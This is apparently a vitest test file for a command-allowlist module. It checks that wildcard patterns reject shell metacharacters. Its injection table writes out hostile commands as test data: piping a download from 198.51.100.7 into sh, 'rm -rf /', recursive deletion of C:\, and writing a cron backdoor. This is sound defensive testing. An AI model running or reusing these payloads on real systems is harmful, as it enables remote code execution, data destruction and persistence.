import { describe, expect, it } from 'vitest';

import {
  commandArguments,
  commandPolicyProblems,
  commandPolicySchema,
  createCommandAuthorize,
  MAX_COMMAND_BYTES,
} from './command.ts';

import type { z } from 'zod';

const SCHEMA = commandArguments({ command: 'the command', stdin: 'the input' });

function problemsOf(parsed: z.ZodSafeParseResult<unknown>): readonly string[] {
  return parsed.success ? [] : parsed.error.issues.map((issue) => issue.message);
}

function problemsFor(input: Readonly<Record<string, unknown>>): readonly string[] {
  return problemsOf(SCHEMA.safeParse(input));
}

describe('the shared command arguments', () => {
  it('ACT-27 accepts a command with a tab and, for an any-command target, a newline', () => {
    expect(SCHEMA.parse({ command: 'echo\tone\ntwo\r' })).toStrictEqual({
      command: 'echo\tone\ntwo\r',
    });
  });

  it('ACT-27 refuses a NUL byte, and says so once', () => {
    expect(problemsFor({ command: 'up\u{0}time' })).toStrictEqual(['must not contain a NUL byte']);
  });

  it('ACT-27 refuses another control character, which no XML envelope could carry', () => {
    expect(problemsOf(SCHEMA.safeParse({ command: 'echo \u{1B}[31m' }))).toStrictEqual([
      'must not contain a control character other than tab, carriage return or newline',
    ]);
  });

  it('ACT-27 refuses a command beyond 16 KiB, an empty one and standard input beyond 64 KiB', () => {
    expect(problemsFor({ command: 'x'.repeat(MAX_COMMAND_BYTES + 1) })).toStrictEqual([
      'must be at most 16 KiB',
    ]);
    expect(problemsFor({ command: '' })).toHaveLength(1);
    expect(problemsFor({ command: 'ok', stdin: 'x'.repeat(64 * 1024 + 1) })).toHaveLength(1);
    expect(problemsFor({ command: 'ok', extra: 1 })).toHaveLength(1);
  });
});

const RESTRICTED = createCommandAuthorize({ allowAnyCommand: false });
const UNRESTRICTED = createCommandAuthorize({ allowAnyCommand: true });

function policy(
  overrides: Readonly<Record<string, unknown>>,
): ReturnType<typeof commandPolicySchema.parse> {
  return commandPolicySchema.parse(overrides);
}

describe('ACT-35 a wildcard is a wildcard, not a shell', () => {
  /**
   * The patterns the operator guide recommends, each with the payload both
   * reviewers used to show that a `*` spans a shell metacharacter and so
   * turns an allowlisted target into an unrestricted one.
   */
  const INJECTIONS: readonly (readonly [string, string])[] = [
    [
      'journalctl -u nginx --since * --no-pager',
      'journalctl -u nginx --since $(curl -s http://198.51.100.7/p | sh) --no-pager',
    ],
    ['systemctl status *', 'systemctl status nginx; rm -rf /'],
    ['Get-Service -Name *', String.raw`Get-Service -Name Spooler; Remove-Item C:\ -Recurse`],
    ['uptime *', 'uptime `id`'],
    ['uptime *', 'uptime && curl http://198.51.100.7 | sh'],
    ['uptime *', 'uptime > /etc/cron.d/backdoor'],
  ];

  it.each(INJECTIONS)(
    'ACT-35 ACT-39 the pattern %s does not admit a second command',
    (pattern, command) => {
      expect(RESTRICTED(policy({ allowed_commands: [pattern] }), { command })).toStrictEqual({
        allowed: false,
        reason: 'command_metacharacter',
      });
    },
  );

  it('ACT-35 the commands the guide actually recommends are still allowed', () => {
    const allowed = policy({
      allowed_commands: ['uptime', 'systemctl status nginx', 'journalctl -u nginx --since *'],
    });
    for (const command of [
      'uptime',
      'systemctl status nginx',
      "journalctl -u nginx --since '2 hours ago'",
      'journalctl -u nginx --since 2026-09-01',
    ]) {
      expect(RESTRICTED(allowed, { command })).toStrictEqual({ allowed: true, operation: 'shell' });
    }
  });

  it('ACT-88 an any-command target still takes a metacharacter: that is what it is for', () => {
    const shell = policy({ allowed_commands: [], any_command: true });
    expect(UNRESTRICTED(shell, { command: 'uptime; rm -rf /tmp/x' })).toStrictEqual({
      allowed: true,
      operation: 'shell',
    });
    expect(RESTRICTED(shell, { command: 'uptime; rm -rf /tmp/x' })).toStrictEqual({
      allowed: false,
      reason: 'command',
    });
  });

  it('ACT-35 refuses at save a pattern that could never match, because the runtime refuses its metacharacter', () => {
    expect(
      commandPolicyProblems(policy({ allowed_commands: ['systemctl status nginx | cat'] })),
    ).toStrictEqual([
      'policy.allowed_commands: the pattern "systemctl status nginx | cat" can never match, ' +
        'because a command on a restricted target may not contain ; & | ` $ < > ( or ); set ' +
        'any_command for a target that needs a shell',
    ]);
    expect(commandPolicyProblems(policy({ allowed_commands: ['uptime'] }))).toStrictEqual([]);
    expect(
      commandPolicyProblems(policy({ allowed_commands: [], any_command: true })),
    ).toStrictEqual([]);
  });
});
